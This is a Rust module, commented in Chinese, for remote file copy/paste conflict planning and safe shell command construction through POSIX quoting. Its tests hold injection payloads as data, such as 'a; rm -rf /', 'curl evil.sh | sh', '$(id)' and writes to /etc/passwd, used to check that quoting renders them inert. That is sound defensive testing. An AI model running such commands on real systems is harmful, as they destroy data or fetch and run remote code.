//! 远端文件操作的纯逻辑（M7.3）：剪切 / 复制 / 粘贴的冲突裁决，以及命令构造。
//!
//! # 为什么复制要走 exec 而不是 SFTP
//!
//! SFTP 协议**没有服务端复制**。用 SFTP 做「远端 → 远端」的复制意味着把字节下载到本机再传回去——
//! 一个 2 GB 的目录要走两趟网络，而用户按的是「复制粘贴」，他预期的是本机文件管理器那样的瞬间完成。
//! `cp -R` 在服务端就地完成，是唯一符合预期的做法。剪切（同主机移动）用 SFTP 的 `rename` 就够，
//! 不必落到 shell。
//!
//! # 于是路径成了 shell 输入，这是本模块的安全核心
//!
//! 文件名里出现空格、引号、`$`、反引号、甚至换行都是**合法且常见**的。把路径直接拼进命令串
//! 等于让任何一个能在远端建文件的人拿到命令执行。[`sh_quote`] 用 POSIX 单引号包裹并把内嵌单引号
//! 拆成 `'\''`——单引号内除了单引号本身，shell 不解释任何字符，这是唯一无需穷举元字符的做法。
//!
//! # 冲突裁决是纯函数
//!
//! 「目标已存在」时该覆盖、改名还是跳过，是**决策**；执行是另一回事。分开之后决策可以逐格测，
//! 而出口原文要的正是「冲突/覆盖/失败三种情形都有明确行为并有测试」。

use serde::{Deserialize, Serialize};

/// 用 POSIX 单引号把一段文本包成一个 shell 参数。
///
/// 单引号内 shell 不解释任何字符（连反斜杠都不解释），唯一需要处理的是单引号自身：
/// 先闭合、插一个转义单引号、再重开——`it's` → `'it'\''s'`。
/// 这条规则对 sh / bash / dash / busybox ash 一致，不依赖任何扩展。
pub fn sh_quote(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 2);
    out.push('\'');
    for ch in s.chars() {
        if ch == '\'' {
            out.push_str("'\\''");
        } else {
            out.push(ch);
        }
    }
    out.push('\'');
    out
}

/// 目标已存在时怎么办。三档是**用户当次选择**，没有默认——
/// 替用户默认「覆盖」会让一次误粘贴毁掉原文件，默认「跳过」又会让用户以为复制成功了。
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ConflictPolicy {
    Overwrite,
    KeepBoth,
    Skip,
}

/// 一次粘贴里对单个条目的裁决。
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct PasteOp {
    /// 源的完整路径。
    pub src: String,
    /// 目标的完整路径（`KeepBoth` 时已经是改过名的那个）。
    pub dst: String,
    /// 落到目标目录里的最终文件名（界面上要显示「实际存成了什么」）。
    pub dst_name: String,
    /// 这一条是不是因为冲突而改了名。
    pub renamed: bool,
    /// 剪切（移动）还是复制。
    pub cut: bool,
    /// **这一条会毁掉一个已经存在的目标**——只有用户在冲突框里选了「覆盖」才为真。
    ///
    /// 单独立一个字段，而不是在执行层用「没改名 = 那就覆盖吧」去反推：那个反推对
    /// 不冲突的条目也成立（它同样没改名），于是每一次普通剪切都会先对目标发一次删除。
    /// 那条删除今天恰好打在不存在的路径上因而无害，但「删哪一个」这种事不该由推断决定。
    pub overwrite: bool,
}

/// 一次粘贴的完整计划。
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct PastePlan {
    pub ops: Vec<PasteOp>,
    /// 因 `Skip` 而没有执行的条目名（界面上要说清「这几个没动」）。
    pub skipped: Vec<String>,
    /// 因**源与目标是同一个路径**而拒绝的条目名。
    ///
    /// 这不是冲突，是无意义操作：`cp a a` 会报错，`mv a a` 静默成功但什么都没发生，
    /// 而「复制到自己所在的目录」是用户很容易做出的动作。单列一档才说得清。
    pub same_path: Vec<String>,
}

/// 路径拼接（远端一律用 `/`）。`dir` 为 `/` 时不产生 `//`。
pub fn join_remote(dir: &str, name: &str) -> String {
    let d = dir.trim_end_matches('/');
    if d.is_empty() {
        format!("/{name}")
    } else {
        format!("{d}/{name}")
    }
}

/// 取路径的最后一段（文件名）。
pub fn base_name(path: &str) -> &str {
    path.rsplit('/').next().unwrap_or(path)
}

/// 冲突改名：`a.txt` → `a (2).txt`，一直加到不撞为止。
///
/// 后缀识别用**最后一个点**且不能在开头：`.bashrc` 整个是名字（没有扩展名），
/// `a.tar.gz` 的扩展名是 `.gz`——与 Windows 资源管理器和 macOS Finder 的行为一致。
/// 编号从 2 起（第一个副本是「第 2 个」，不是「第 1 个」）。
pub fn unique_name(name: &str, taken: &[String]) -> String {
    if !taken.iter().any(|t| t == name) {
        return name.to_string();
    }
    let (stem, ext) = match name.rfind('.') {
        Some(i) if i > 0 => (&name[..i], &name[i..]),
        _ => (name, ""),
    };
    for n in 2..10_000 {
        let cand = format!("{stem} ({n}){ext}");
        if !taken.contains(&cand) {
            return cand;
        }
    }
    // 一万个同名副本：不再编号，交给调用方按「失败」处理（返回原名必然撞，执行时会报错）。
    name.to_string()
}

/// 规划一次粘贴。**纯函数**：不碰网络、不碰文件系统。
///
/// · `srcs`：源的完整路径列表（剪切与复制的源形状相同）；
/// · `dst_dir`：目标目录；
/// · `existing`：目标目录里**已有**的名字（调用方现列一次）；
/// · `policy`：用户对冲突的当次选择。
///
/// `KeepBoth` 的改名要把**本批已经占用的名字**也算进去——两个同名源粘到同一个目录时，
/// 第二个必须避开第一个刚起的新名字，否则后者会覆盖前者而用户以为两个都在。
pub fn plan_paste(
    srcs: &[String],
    dst_dir: &str,
    existing: &[String],
    policy: ConflictPolicy,
    cut: bool,
) -> PastePlan {
    let mut taken: Vec<String> = existing.to_vec();
    let mut ops = Vec::new();
    let mut skipped = Vec::new();
    let mut same_path = Vec::new();

    for src in srcs {
        let name = base_name(src).to_string();
        let plain_dst = join_remote(dst_dir, &name);
        if &plain_dst == src {
            same_path.push(name);
            continue;
        }
        let conflicts = existing.contains(&name);
        if !conflicts {
            taken.push(name.clone());
            ops.push(PasteOp {
                src: src.clone(),
                dst: plain_dst,
                dst_name: name,
                renamed: false,
                cut,
                overwrite: false,
            });
            continue;
        }
        match policy {
            ConflictPolicy::Skip => skipped.push(name),
            ConflictPolicy::Overwrite => {
                ops.push(PasteOp {
                    src: src.clone(),
                    dst: plain_dst,
                    dst_name: name,
                    renamed: false,
                    cut,
                    overwrite: true,
                });
            }
            ConflictPolicy::KeepBoth => {
                let fresh = unique_name(&name, &taken);
                taken.push(fresh.clone());
                ops.push(PasteOp {
                    src: src.clone(),
                    dst: join_remote(dst_dir, &fresh),
                    dst_name: fresh,
                    renamed: true,
                    cut,
                    overwrite: false,
                });
            }
        }
    }
    PastePlan {
        ops,
        skipped,
        same_path,
    }
}

/// 远端复制命令。`-R` 递归、`-f` 覆盖（是否覆盖由**计划**决定，到这一步已经定了）、
/// `--` 终止选项解析（文件名以 `-` 开头时不被当成选项）。
pub fn copy_command(src: &str, dst: &str) -> String {
    format!("cp -Rf -- {} {}", sh_quote(src), sh_quote(dst))
}

/// 远端脚本的**前台**命令：用 `sh` 显式解释，不依赖脚本的可执行位与 shebang。
///
/// 不加 `&`——前台就是前台，输出要能进终端。
pub fn run_script_foreground(path: &str) -> String {
    format!("sh {}", sh_quote(path))
}

/// 远端脚本的**后台**命令。
///
/// `nohup` + 重定向 + `&`：脱离本次 SSH 会话，**关掉本程序它仍在跑**。这句话必须在界面上
/// 原样告诉用户（出口原文点名），因为它正是后台与前台唯一的实质差别，也是唯一会留下
/// 「没人管的远端常驻进程」的那一档。
///
/// 输出落到 `nohup.out` 之外的地方吗？不——保持 `nohup` 的默认行为（当前目录的 `nohup.out`），
/// 换个我们自己编的路径会让用户按经验去找却找不到。
pub fn run_script_background(path: &str) -> String {
    format!("nohup sh {} </dev/null >nohup.out 2>&1 &", sh_quote(path))
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── sh_quote：本模块的安全核心 ──────────────────────────────────────────

    #[test]
    fn ordinary_names_round_trip() {
        assert_eq!(sh_quote("a.txt"), "'a.txt'");
        assert_eq!(sh_quote("/var/log/syslog"), "'/var/log/syslog'");
        assert_eq!(sh_quote("有中文 的 名字.sh"), "'有中文 的 名字.sh'");
    }

    /// 每一条都是「在远端建一个这样的文件名 = 拿到命令执行」的现成利用。
    #[test]
    fn injection_payloads_become_inert_literals() {
        for evil in [
            "a; rm -rf /",
            "a && curl evil.sh | sh",
            "$(id)",
            "`id`",
            "a\nrm -rf /",
            "a|tee /etc/passwd",
            "a>out",
            "a$HOME",
            "--no-preserve-root",
        ] {
            let q = sh_quote(evil);
            assert!(q.starts_with('\'') && q.ends_with('\''), "{q}");
            // 引号内部除了转义过的单引号，不许出现裸单引号（那会提前闭合）
            let inner = &q[1..q.len() - 1];
            assert!(
                !inner.contains('\'') || inner.contains("'\\''"),
                "{evil:?} 的引号处理不对：{q}"
            );
        }
    }

    /// 名字里带单引号是最容易写错的一处：闭合 → 转义 → 重开。
    #[test]
    fn embedded_single_quotes_are_closed_escaped_reopened() {
        assert_eq!(sh_quote("it's"), r"'it'\''s'");
        assert_eq!(sh_quote("'"), r"''\'''");
        assert_eq!(sh_quote("a'b'c"), r"'a'\''b'\''c'");
    }

    #[test]
    fn commands_terminate_option_parsing() {
        // 文件名以 - 开头时不被当成选项
        let c = copy_command("-rf", "/tmp/x");
        assert!(c.contains(" -- "), "{c}");
        assert!(c.contains("'-rf'"), "{c}");
    }

    // ── 路径工具 ────────────────────────────────────────────────────────────

    #[test]
    fn join_and_base() {
        assert_eq!(join_remote("/var/log", "a.txt"), "/var/log/a.txt");
        assert_eq!(join_remote("/", "a.txt"), "/a.txt");
        assert_eq!(join_remote("/var/log/", "a.txt"), "/var/log/a.txt");
        assert_eq!(join_remote("", "a.txt"), "/a.txt");
        assert_eq!(base_name("/var/log/a.txt"), "a.txt");
        assert_eq!(base_name("a.txt"), "a.txt");
        assert_eq!(base_name("/"), "");
    }

    #[test]
    fn unique_name_follows_desktop_conventions() {
        let taken = vec!["a.txt".to_string()];
        assert_eq!(unique_name("a.txt", &taken), "a (2).txt");
        assert_eq!(unique_name("b.txt", &taken), "b.txt", "不撞就不该改名");
        // 连续冲突继续加
        let taken2 = vec!["a.txt".into(), "a (2).txt".into()];
        assert_eq!(unique_name("a.txt", &taken2), "a (3).txt");
        // 点开头的整个是名字（`.bashrc` 没有扩展名）
        assert_eq!(
            unique_name(".bashrc", &[".bashrc".to_string()]),
            ".bashrc (2)"
        );
        // 多重扩展名只认最后一段（与资源管理器 / Finder 一致）
        assert_eq!(
            unique_name("a.tar.gz", &["a.tar.gz".to_string()]),
            "a.tar (2).gz"
        );
        // 无扩展名
        assert_eq!(unique_name("data", &["data".to_string()]), "data (2)");
    }

    // ── 冲突裁决：出口原文点名的三种情形 ────────────────────────────────────

    fn srcs(v: &[&str]) -> Vec<String> {
        v.iter().map(|s| s.to_string()).collect()
    }

    #[test]
    fn no_conflict_is_a_plain_copy() {
        let p = plan_paste(
            &srcs(&["/src/a.txt"]),
            "/dst",
            &["b.txt".to_string()],
            ConflictPolicy::Skip,
            false,
        );
        assert_eq!(p.ops.len(), 1);
        assert_eq!(p.ops[0].dst, "/dst/a.txt");
        assert!(!p.ops[0].renamed);
        assert!(p.skipped.is_empty());
    }

    #[test]
    fn overwrite_keeps_the_original_name() {
        let p = plan_paste(
            &srcs(&["/src/a.txt"]),
            "/dst",
            &["a.txt".to_string()],
            ConflictPolicy::Overwrite,
            false,
        );
        assert_eq!(p.ops.len(), 1);
        assert_eq!(p.ops[0].dst_name, "a.txt");
        assert!(!p.ops[0].renamed);
    }

    #[test]
    fn keep_both_renames_and_reports_it() {
        let p = plan_paste(
            &srcs(&["/src/a.txt"]),
            "/dst",
            &["a.txt".to_string()],
            ConflictPolicy::KeepBoth,
            false,
        );
        assert_eq!(p.ops[0].dst_name, "a (2).txt");
        assert!(p.ops[0].renamed, "改了名却不报告 = 用户找不到自己粘的文件");
    }

    /// 两个同名源粘到同一目录：第二个必须避开第一个**刚起的**新名字。
    /// 只看 `existing` 的实现会给两个都起 `a (2).txt`，后者覆盖前者而用户以为两个都在。
    #[test]
    fn keep_both_avoids_names_taken_within_the_same_batch() {
        let p = plan_paste(
            &srcs(&["/x/a.txt", "/y/a.txt"]),
            "/dst",
            &["a.txt".to_string()],
            ConflictPolicy::KeepBoth,
            false,
        );
        assert_eq!(p.ops.len(), 2);
        assert_eq!(p.ops[0].dst_name, "a (2).txt");
        assert_eq!(p.ops[1].dst_name, "a (3).txt");
        assert_ne!(p.ops[0].dst, p.ops[1].dst, "两个源被粘成同一个目标");
    }

    #[test]
    fn skip_leaves_the_target_alone_and_says_which() {
        let p = plan_paste(
            &srcs(&["/src/a.txt", "/src/b.txt"]),
            "/dst",
            &["a.txt".to_string()],
            ConflictPolicy::Skip,
            false,
        );
        assert_eq!(p.ops.len(), 1, "只有不冲突的那个该被执行");
        assert_eq!(p.ops[0].dst_name, "b.txt");
        assert_eq!(p.skipped, vec!["a.txt".to_string()]);
    }

    /// 粘到源自己所在的目录：不是冲突，是无意义操作。
    /// 混进「冲突」里的话，选「覆盖」会得到 `cp a a`（报错），选「保留两者」会凭空多出一份副本。
    #[test]
    fn pasting_into_its_own_directory_is_reported_separately() {
        let p = plan_paste(
            &srcs(&["/dst/a.txt"]),
            "/dst",
            &["a.txt".to_string()],
            ConflictPolicy::Overwrite,
            false,
        );
        assert!(p.ops.is_empty());
        assert!(p.skipped.is_empty());
        assert_eq!(p.same_path, vec!["a.txt".to_string()]);
    }

    /// `overwrite` 是执行层唯一的「先删目标」开关，必须只在用户真的选了「覆盖」时为真。
    ///
    /// 三档一起测：漏掉任何一档，删除就会打到一个用户没同意删的目标上——而 SFTP 的删除
    /// 没有回收站。
    #[test]
    fn only_the_overwrite_policy_marks_an_op_destructive() {
        let existing = ["a.txt".to_string()];
        for (policy, want) in [
            (ConflictPolicy::Overwrite, true),
            (ConflictPolicy::KeepBoth, false),
        ] {
            let p = plan_paste(&srcs(&["/src/a.txt"]), "/dst", &existing, policy, true);
            assert_eq!(p.ops.len(), 1, "{policy:?}");
            assert_eq!(p.ops[0].overwrite, want, "{policy:?} 的 overwrite 标记错了");
        }
        // Skip 档根本不产生 op（更谈不上删除）
        let p = plan_paste(
            &srcs(&["/src/a.txt"]),
            "/dst",
            &existing,
            ConflictPolicy::Skip,
            true,
        );
        assert!(p.ops.is_empty());
        // 不冲突的条目也不得带这个标记：它同样「没改名」，靠反推就会被算成覆盖
        let p = plan_paste(
            &srcs(&["/src/z.txt"]),
            "/dst",
            &existing,
            ConflictPolicy::Overwrite,
            true,
        );
        assert_eq!(p.ops.len(), 1);
        assert!(!p.ops[0].overwrite, "不冲突的条目被标成了覆盖");
    }

    #[test]
    fn cut_flag_travels_with_every_op() {
        let p = plan_paste(
            &srcs(&["/src/a.txt"]),
            "/dst",
            &[],
            ConflictPolicy::Skip,
            true,
        );
        assert!(p.ops[0].cut);
    }

    // ── 脚本运行 ────────────────────────────────────────────────────────────

    #[test]
    fn foreground_does_not_detach() {
        let c = run_script_foreground("/tmp/deploy.sh");
        assert!(!c.contains('&'), "前台命令不该带 &：{c}");
        assert!(!c.contains("nohup"), "{c}");
        assert!(c.starts_with("sh "), "{c}");
    }

    /// 后台的三件事缺一不可：脱离终端、不占标准输入、放到后台。
    /// 少 `nohup` 则挂断信号会杀掉它；少 `</dev/null` 则脚本读输入时会挂住整条通道。
    #[test]
    fn background_really_detaches() {
        let c = run_script_background("/tmp/deploy.sh");
        assert!(c.starts_with("nohup "), "{c}");
        assert!(
            c.contains("</dev/null"),
            "少了这个，读输入的脚本会挂住通道：{c}"
        );
        assert!(c.trim_end().ends_with('&'), "{c}");
    }

    #[test]
    fn script_paths_are_quoted_too() {
        let evil = "/tmp/a; rm -rf /";
        assert!(run_script_foreground(evil).contains(&sh_quote(evil)));
        assert!(run_script_background(evil).contains(&sh_quote(evil)));
    }
}
